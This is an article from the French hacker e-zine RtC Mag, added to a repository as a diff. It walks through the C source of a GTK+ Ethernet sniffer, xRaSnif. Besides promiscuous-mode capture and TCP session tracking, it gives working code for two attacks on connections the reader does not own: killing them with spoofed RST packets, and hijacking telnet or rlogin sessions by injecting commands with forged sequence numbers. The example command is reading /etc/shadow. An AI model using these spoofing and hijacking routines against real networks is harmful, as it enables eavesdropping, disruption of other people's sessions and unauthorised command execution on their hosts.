@@ -1,0 +1,412 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  Programmation d'un Sniffer Ethernet #2  ]
+----[  by RaPass <rapass@gmx.net>  ]
+
+
+-------[  Introduction
+
+
+    Comme pour le premier, la comprehension de ce texte implique la connaissance du language C et de la programmation reseau sous Linux/Unix...
+
+    Dans mon premier texte, j'ai essayer d'expliquer la partie "theorique" du sniffing : dans celui la, je vais me concentrez sur ce qu'on pourrait appeler la partie pratique c'est a dire la programmation d'un sniffer et tout ce qui
+rime avec sniffing  : spoofing, hijacking .... Pour illustrer ce texte, j'ai code un sniffer ethernet TCP/IP et ICMP/IP dont
+je livre les sources bien entendu (xrasnif.tgz).
+xRaSnif (c'est comme ca qu'il s'appelle mon sniffer) fonctionne sous X et a ete code a l'aide des librairies GTK+. Il sniffe tout les paquets TCP/IP et ICMP/IP qui transitent sur le sous-reseau ethernet. (enfin pas exactement tous:()
+
+    xRaSnif fonctionne de la facon suivante : un thread gere l'interface graphique, la redessine, gere les signaux de GTK et un autre thread attend que des paquets arrivent et affiche les resultats dans l'interface graphique.
+
+
+-------[  Explications
+
+
+Le debut du programme: main.c:
+
+1. On verifie que c'est bien le root qui a lance le programme
+  if (getuid() || geteuid()) {
+    fprintf(stderr, "Vous devez etre root pour executer ce programme.\n");
+    exit(0);
+    }
+
+3. On creer une socket pour pouvoir sniffer
+  if ((sock_for_sniffe = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL))) < 0)
+    perror("Creation socket");
+
+4. Et on met la carte reseau en mode promiscuous 
+  set_promisc(hehe, sock_for_sniffe);
+
+5. On creer un thread et on lui fait lancer la fonction filter(expliquer + bas)
+
+6. On creer l'interface graphique
+  xinterface(argc, argv, widgets);
+ 
+    La fonction xinterface() creer 2 Clist ou vont etre ecrit les differents paquet recu et traiter par l'autre thread. la Clist TCP est pointe par widgets[0], et la variable widgets[1] pointe sur la Clist ICMP.
+    Je m'attarde pas trop sur l'interface graphique, ce n'est pas le sujet de ce texte.
+
+    C'est la fonction filter qui filtre les paquets . Voici les lignes les plus importante de cette fonction(g simplifier le code pour + de comprehension) :
+
+--- filter.c (simplifie!) -----------------------------------------------------
+
+char trame[2000]  /* C la que va etre stocker la trame a traiter. */
+struct iphdr *ip; /* Pointeur sur l'entete IP */
+struct tcphdr *tcp; /* Pointeur sur l'entete TCP */
+struct icmphdr * icmp; /* Pointeur sur l'entete ICMP */
+
+/** On fait pointer les pointeurs sur les differnets header **/
+/* ENTETE_ETH n'est rien d'autre qu'un "sizeof(struct ethdr)"*/
+/* et pareil pour les autres ..*/
+ 
+ip = (struct iphdr *) (trame + ENTETE_ETH);
+tcp = (struct tcphdr *) (trame + ENTETE_ETH + ENTETE_IP);
+icmp = (struct icmphdr *) (trame + ENTETE_ETH + ENTETE_IP);
+/* NOTE: Selon le protocole, on utlisera soit le pointeur tcp soit le pointeur
+icmp, il pointe sur la meme chose */ 
+
+while (1) {  /* boucle de reception des paquets */
+  read(sock, (char *)trame, sizeof(trame));
+  if (ip->protocol == IPPROTO_TCP) /* SI c'est le procol TCP, on lance la */
+    sniffe_TCP(trame, widgets[0], NbrLignes); /* fonction sniffe_TCP */
+  if (ip->protocol == IPPROTO_ICMP) /* Si c'est le protocol ICMP, on lance la*/
+    sniffe_ICMP(ip, icmp, widgets[1]); /* fonction sniffe_ICMP */
+  }
+
+--- filter.c (simplifie!) -----------------------------------------------------
+
+
+  ** ICMP **
+
+    chaque paquet icmp recu est inscrit dans une liste (Une Clist pour GTK) avec ses principaux champs : addresse source, adresse de destination, type de requete ICMP, code et taille de la requet ICMP. Selon moi, ce sont les champs les plus importants mais libre a vous de modifier les sources selon vos besoins.
+    Le sniffing de requete ICMP n'est pas tres difficile car il n'y a pas de connections, on prend les paquets comme ils arrivent et on les affichent.
+
+
+--- sniffe_ICMP.c (simplifie!) ------------------------------------------------
+
+unsigned char *so, *dest; /* ces pointeur servent a traduire l'adresse IP */
+gchar *insert[5]; /* et ceux la servent a remplir une ligne de la Clist */
+
+so = (unsigned char *)&(ip->saddr);
+dest = (unsigned char *)&(ip->daddr);
+
+/** On remplit la ligne de la Clist **/
+insert[0]=g_strdup_printf("%u.%u.%u.%u", so[0],so[1],so[2],so[3]);
+insert[1]=g_strdup_printf("%u.%u.%u.%u", dest[0],dest[1],dest[2],dest[3]);
+insert[2]=g_strdup_printf("%d", icmp->type);
+insert[3]=g_strdup_printf("%d", icmp->code);
+insert[4]=g_strdup_printf("%d", ntohs(ip->tot_len)-sizeof(struct iphdr));
+/** Et on ajoute la ligne dans la Clist **/
+gtk_clist_append(GTK_CLIST(Liste), insert);
+
+--- sniffe_ICMP.c (simplifie!) ------------------------------------------------
+
+
+  ** TCP/IP **
+
+    Alors la,c'est plus dur,ce n'est pas chaque paquets TCP qui est inscrit dans la liste(y en aurait trop...Imaginer un transfert de fichier en FTP!). nan nan, on va seulement afficher 2 lignes par connections dans la liste, une
+pour chaque sens.
+    C'est ca qui est plus complique, lorsqu'un paquet arrive, il faut l'examiner et voir s'il fait partie d'une connection qui appartient a la liste :
+  Si oui : On n'ajoute pas de ligne, on regarde le paquet pour voir ce que c'est.
+  Si non : On ajoute une ligne dans la liste.
+    Le sniffer doit reagir comme l'implementation TCP/IP d'un OS (un peu + simple) :
+  Si on recoit un paquet TCP avec le flag RST a 1, on enleve la connection de la liste(les deux sens)
+  Si on recoit un paquet avec le flags ACK en retour d'un paquet avec le flag FIN pareil, on enleve la connection dans les 2 sens (hum..La fin d'une connection ne marche pas tout a fait comme ca mais c'est une solution qui marche. En effet, apres la reception d'un paquet FIN, le TCP recepteur finit d'envoyer ce qu'il a a envoyer avant d'emettre a son tour un FIN (Lire le rfc sur le TCP) qui va lui finir la connection pour de bon.).
+
+    Pour chaque sens de connection, c'est a dire pour chaque ligne de la Clist, on garde en memoire les entetes IP et TCP du dernier paquet recu pour pouvoir spoofer mais on verra ca plus tard.
+    Bien sur, le plus important, on garde les donnees qui etaient dans le paquet a la suite de l'entete TCP : On ecrit les donnees dans un fichier par ex.
+
+    La Clist TCP ne contient que 3 colonnes:
+-Date/heure du 1er paquet recu(sniffe) de ce sens de connection. 
+-adresse et port source.
+-adresse et port de destination.
+
+--- NOTE ----------------------------------------------------------------------
+
+    Je met que 2-3 colonnes parce que j'ai teste en mettant plusieurs champs d'un paquet TCP sur la Clist ca bugge, ca donnait un truc du genre:
+ _____________________________________________________________________________
+| Addr source | Addr dest | Numero de sequence | Numero A/R | Flags | Fenetre |
+|~~~~~~~~~~~~~|~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~|~~~~~~~|~~~~~~~~~|
+| 192.168.0.5 |192.168.0.9|    589632541       |    2546897 | A-----|  3200   |
+| 192.168.0.9 |192.168.0.5|    2546897         |  589632541 | A--P--|  3200   |
+|   ...                         ...                          ...              |
+|_____________________________________________________________________________|
+
+    Donc a chaque reception des paquets,les champs s'actualisaient mais le pb c'est que lors des grosse connection (download de gros fichiers en FTP) les paquets arrivaient tellement vite que l'interface etait deborde et buggait violement au bout de 25 ms(ARgth!!) Tout le programme se bloquer royalement!
+
+--- NOTE ----------------------------------------------------------------------
+
+--- sniffe_TCP.c (simplifie!) -------------------------------------------------
+
+/** Cette Fonction recherche si le paquet recu appartient a une connection **/
+/** deja enregistre **/ 
+
+int cherche_connection(struct iphdr *ip1, struct tcphdr *tcp1, 
+                       int nbr_connections, int mode) {
+  int i;
+  struct iphdr *ip2;
+  struct tcphdr *tcp2;
+
+  for(i=0 ; i < nbr_connections ; i++) {
+    ip2 =(struct iphdr *)(connections[i] + SIZE_WID + ENTETE_ETH);
+    tcp2 =(struct tcphdr *)(connections[i] + SIZE_WID + 
+                            ENTETE_ETH + ENTETE_IP);
+    
+    if (mode == 0) {
+      if((ip1->saddr == ip2->saddr) && (ip1->daddr == ip2->daddr) && 
+	 (tcp1->source == tcp2->source) && (tcp1->dest == tcp2->dest))   
+	return i;
+    }
+     else {
+      if ((ip1->saddr == ip2->daddr) && (ip1->daddr == ip2->saddr) && 
+	  (tcp1->source == tcp2->dest) && (tcp1->dest ==tcp2->source))
+	return i;
+    }	
+  }
+  return -1;
+}
+
+/** cette fonction alloue un espace memoire d'un sens de connection **/
+int ajoute_connection(char *trame, int nbr_connections) {
+
+  connections[nbr_connections] = malloc(SIZE_WID + TAILLE_TRAME);
+  bcopy(trame, connections[nbr_connections] + SIZE_WID, TAILLE_TRAME);
+  fprintf(stderr, "AJOUT CONNECTION :: Il y a maintenant %d connections sniffé.\n", nbr_connections+1); 
+  return nbr_connections+1;
+}
+/** Cette fonction libebre l'espace memoire d'un connection qui vient de se **/
+/** terminer et redecale les autres(celles qui restent)  **/
+int enleve_connection(int connect_a_enlever, int nbr_connections) {
+  int i;
+  fprintf(stderr, "Appelle de enleve_connection() sur %d\n", connect_a_enlever);
+  free(connections[connect_a_enlever]);
+  connections[connect_a_enlever] = NULL;
+
+  if (connect_a_enlever < nbr_connections) {
+    for( i= 0 ; connections[connect_a_enlever+i+1] != NULL ; i++)
+      connections[connect_a_enlever+i] = connections[connect_a_enlever+i+1];
+    connections[connect_a_enlever+i] = NULL;
+  }
+  return nbr_connections-1;
+}
+
+/** gere la CList TCP en fonction des paquets qui arrivent(ajout et retrait de
+ligne) et garde en memoire les derniers headers de chaque sens de connection **/
+
+int sniffe_TCP(char *trame, GtkWidget *Liste, int nbr_connections) {
+ 
+  int  ligne;
+  struct iphdr *ip;
+  struct tcphdr *tcp, *tcp2;
+    
+  gchar *insert[2]; /** les deux champs d'une colonne de la Clist **/
+  unsigned char *so, *dest; /** pour les adresses IP **/
+
+  ip = (struct iphdr *) (trame + ENTETE_ETH);
+  tcp = (struct tcphdr *) (trame + ENTETE_ETH + ENTETE_IP);
+
+  /*----Reception pacquet RST (qui enleve les 2 lignes) --*/
+    if (tcp->rst == 1) {
+      if ((ligne = cherche_connection(ip, tcp, nbr_connections, 0)) != -1) {
+	gtk_clist_remove(GTK_CLIST(Liste), ligne);
+	nbr_connections = enleve_connection(ligne, nbr_connections);
+      }
+      if ((ligne = cherche_connection(ip, tcp, nbr_connections, 1))  != -1) {
+	gtk_clist_remove(GTK_CLIST(Liste), ligne);
+        nbr_connections = enleve_connection(ligne, nbr_connections);
+      }
+    }
+    else {
+
+  /* ----SI c l'ACK d'un paquet FIN ... -----------*/
+      if((ligne = cherche_connection(ip, tcp, nbr_connections, 1)) != -1) {
+    
+	tcp2 = (struct tcphdr *) (connections[ligne] + SIZE_WID + ENTETE_ETH + ENTETE_IP);
+ 
+	if (tcp2->fin == 1) {
+	  fprintf(stderr, "ACK d'un paquet FIn!!\n");
+	  gtk_clist_remove(GTK_CLIST(Liste), ligne);
+	  nbr_connections = enleve_connection(ligne, nbr_connections);
+	  
+	  if ((ligne = cherche_connection(ip, tcp, nbr_connections, 0)) != -1) {
+      	    gtk_clist_remove(GTK_CLIST(Liste), ligne);
+	    nbr_connections = enleve_connection(ligne, nbr_connections); 
+	  }
+	  return nbr_connections;
+	}
+      }
+      
+  /*------Si cette connection n'existe pas, on ajoute une ligne -----------*/
+      if ((ligne = cherche_connection(ip, tcp, nbr_connections, 0)) == -1) {
+ 	
+	so = (unsigned char *)&(ip->saddr);  
+	dest = (unsigned char *)&(ip->daddr);
+	insert[0] = g_strdup_printf("%u.%u.%u.%u:%d", 
+				    so[0],so[1],so[2],so[3],ntohs(tcp->source)); 
+ 	insert[1] = g_strdup_printf("%u.%u.%u.%u:%d",	     
+				    dest[0],dest[1],dest[2],dest[3], ntohs(tcp->dest)); 
+	gtk_clist_append(GTK_CLIST(Liste), insert);
+ 	free(insert[0]);
+	free(insert[1]);
+
+	nbr_connections = ajoute_connection(trame, nbr_connections);
+      }
+ /*--------- Sinon, on actualise le dernier paquet ------------------*/
+	bcopy(trame, connections[ligne] + SIZE_WID, TAILLE_TRAME);
+        /* La, on ecrit les datas du paquet sniffe dans un fichier */
+      }
+    }
+    return nbr_connections;
+}
+
+--- sniffe_TCP.c (simplifie!) -------------------------------------------------
+
+    Ne vous etonnez pas si l'interface graphique est un peu lente, c'est normale Il faut passer le pointeur de la souris sur la Clist TCP pour qu'elle s'actualise, je ne sais pas a quoi c'est du ;(
+He oui, c'est la que l'on se rend compte que les programmes en mode texte sur le terminal sont bcp plus puissant, et meme si sous X c'est plus jolie...
+
+
+  ** autres options **
+
+    Mais xRaSnif ne s'arrete pas aux simple sniffing des entetes ICMP/IP et TCP/IP qui passe sur le reseau (ce serait trop con!), je l'ai doter de quelques autres fonctions assez interessante...
+    Cliquez sur une ligne pour afficher ces options, une fenetre devrait s'afficher
+
+ - Voir les entetes IP et TCP : bon ben je crois que le titre est assez explicite : quand vous appuyer sur ce bouton, une fenetre s'affiche avec le valeur de tout les champs des entetes IP et TCP du dernier paquet recu pour ce "sens" de connection TCP.
+
+ - Voir les donnees : Une fenetre va s'ouvrir et va se rempir des donnees echange au cours de la connection et dans 1 seul sens.(correspond un peu a ceux que l'on peut voir quand on lance sniffit en mode interactif : sniffit -i)
+
+ - Killer la connection :
+ || L'idee n'est pas de moi mais les sources le sont a 100% ||
+    Pour stopper une connection qui ne vous appartient pas (forcemment).
+
+    Les idees sont tires du texte "A short overview of IP spoofing:PART I" de Brecht Claerhout que je conseille a ceux qui ne l'on pas encore lu.
+    Pour killer la connection, on va fonctionnner comme ca:
+1. On sniffe en gardant en memoire le derniers paquets recu pour chaque connection.
+2. Lorsque l'on veut killer une connection, on envoie un paquet a un des hotes en se faisant passer pour l'autre : on prend son IP, le meme No de port source que lui et le numero d'A/R que l'on aura calculer a partir du dernier paquet.
+3. des que le destinataire de notre "faux" paquet va le recevoir, il va arreter la connection.
+
+--- NOTE ----------------------------------------------------------------------
+
+Ce n'est pas la peine d'envoyer un paquet RST au deux hotes en connexion puisse que lorsqu'un hote aura compris que la connection est termine(celui a qui on aura envoye le paquet)il n'acceptera plus la connection que l'autre croit tjs en marche et va lui envoyer un paquet RST a son tour. :)
+
+--- NOTE ----------------------------------------------------------------------
+
+
+--- KillerTCP.c (simplifie! ---------------------------------------------------
+
+gboolean killeRST() {
+  struct iphdr *ip;
+  struct tcphdr *tcp, *tcp2;
+  int i;
+
+  /** On fait pointer les pointeurs sur les entetes pour pouvoir fabriquer **/
+  /** un paquet spoofe **/
+  ip =(struct iphdr *)(connections[ligne_select] + SIZE_WID + ENTETE_ETH);
+  tcp =(struct tcphdr *)(connections[ligne_select] + SIZE_WID + 
+			 ENTETE_ETH + ENTETE_IP);
+
+
+  /** On recherche la connection dans le sens inverse **/
+  /** Si il y en a pas ca va pas etre possible **/
+  if ((i = cherche_connection(ip, tcp, NbrLignes, 1)) < 0) 
+    return TRUE;	
+  tcp2 =(struct tcphdr *)(connections[i] + SIZE_WID +
+			  ENTETE_ETH + ENTETE_IP);
+
+  /** Et on envoie un paquet spoofe **/
+  envoie_tcp(ip->saddr, ip->daddr,
+	     ntohs(tcp->source), ntohs(tcp->dest), 
+	     TH_RST, ntohl(tcp2->ack_seq), 0, 512, 
+	     NULL, 0);
+  
+  return TRUE;
+}
+
+--- KillerTCP.c (simplifie! ---------------------------------------------------
+ 
+ - hijacker la connection : permet de lancer des commandes dans une connection qui n'est pas a nous(telnet, rlogin ...), on observera le resulat de la commande dans une fenetre de sniffing de donnees.
+ || L'idee n'est pas de moi mais les sources le sont a 100 % ||
+    Pareil que pour le killing de connection, les idees sont tirees du txt de Brecht Claerhout.
+
+Voila comment on va proceder :
+1. On sniffe en gardant en memoire les derniers paquets recu pour chaque connection(comme toujours).
+2. On envoie une chaine de caractere au serveur en se faisant passer pour le client. On prend l'IP du client, le meme port de depart que lui et les nombres SEQ/ACK valides que l'on aura calculer grace au dernier paquet. la 1er chaine de caractere servira a nettoyer la ligne de commande si le pov client est en pleine commande sinon ca va faire un vieux mix entre ce que tu veux qui s'execute et ce que lui veut executer.
+3. On envoie une deuxieme chaine de caractere qui sera notre commande que l'on veut faire executer.
+4. Pour voir ce que la commande a effectuer (si la commande est cat /etc/shadow par exemple) et bien il ne nous reste qu'a sniffe.
+
+--- HijackTCP.c (simplifie) ---------------------------------------------------
+
+gboolean hijackTCP(GtkWidget *Bouton, GtkWidget **widgets) {
+
+  /** Les pointeurs sur les structures des enetetes TCP/IP **/
+  struct iphdr *ip, *ip2;
+  struct tcphdr *tcp, *tcp2;
+  int i;
+  /** Variable qui va nous servir a stocket le numero de sequence **/
+  long seq;
+  /** Pointeur sur la chaine de caractere a envoye **/
+  char *hijackstring;
+
+  /** On fait pointe les pointeurs sur le dernier paquet de la connection **/
+  ip =(struct iphdr *)(connections[ligne_select] + SIZE_WID + ENTETE_ETH);
+  tcp =(struct tcphdr *)(connections[ligne_select] + SIZE_WID + 
+			 ENTETE_ETH + ENTETE_IP);
+
+  /** On recherche la connection dans le sens inverse **/
+  /** Si il y en a pas ca va pas etre possible **/
+  if ((i = cherche_connection(ip, tcp, NbrLignes, 1)) < 0) 
+    return TRUE;
+  
+  /** On fait pointer ces pointeurs vers le dernier paquet de la connection**/
+  /** en sens inverse **/
+  ip2 =(struct iphdr *)(connections[i] + SIZE_WID + ENTETE_ETH);
+  tcp2 =(struct tcphdr *)(connections[i] + SIZE_WID +
+			    ENTETE_ETH + ENTETE_IP);
+    
+  
+  if (strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) > 0) {
+    /** On calcule le No de sequence **/
+    seq = ntohl(tcp2->seq) + ntohs(ip2->tot_len) - ENTETE_IP - (tcp2->doff*4);
+
+    /** On prepare la chaine a envoye dans le paquet spoofe **/
+    hijackstring = malloc(strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0])))+3);
+    strcpy(hijackstring, gtk_entry_get_text(GTK_ENTRY(widgets[0])));
+    hijackstring[strlen(hijackstring)] = 10;
+    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(widgets[1])))
+      hijackstring[strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) + 1] = 13;
+    else
+      hijackstring[strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0])))+1] = '\0';
+    
+    hijackstring[strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) + 2] = '\0';
+    
+    /** Et on envoie la paquet **/   
+    envoie_tcp(ip->saddr, ip->daddr,
+	     ntohs(tcp->source), ntohs(tcp->dest), TH_ACK | TH_PUSH,
+	     ntohl(tcp2->ack_seq), seq, 32120, 
+	     hijackstring,strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0])))+2);
+    
+    g_free(hijackstring);
+  }
+  return TRUE;
+}
+
+--- HijackTCP.c (simplifie) ---------------------------------------------------
+
+
+    Je n'ai pas trop expliquer ces 2 dernieres techniques pare qu'elles ne sont pas de moi et que vous pourrez vous procurer facilement des infos la dessus en cherchant (http://www.multimania.com/ouah).
+
+    Voici la derniere version de xRaSnif.
+    Pour la compiler, il vous faudra les biblioteques GTK+ mais tout ca est explique dans le README de l'archive.
+
+    J'vais faire un petit break avec GTK parce que la, je vois des GtkWidget et des fichiers core qui me poursuivent dans la rue.............
+
+    Sinon, si vous aimer le sniffing/spoofing/hijacking voici 2 programmes que je vous conseille de posseder:
+
+ - sniffit (ben oui bien sur!) Pour bcp de mondes tout simplement le meilleur sniffer.
+<http://reptile.rug.ac.be/~coder/sniffit/sniffit.html >
+
+ET
+
+ - hunt : Alors la, il est vraiment trop puissant ce putain de programme, il exploite quasiment toutes les failles du protocole TCP/IP sur un reseau Ethernet. Je vous laisse le decouvrir tout seul parce qu'il faudrait plus d'un texte pour le decrire corectement vue le nombre impressionant d'options qu'il comporte.
+ Mister Kra Rulez !
+<http://www.gncz.cz/kra/index.html>
+
+
+
+-------[  EOF
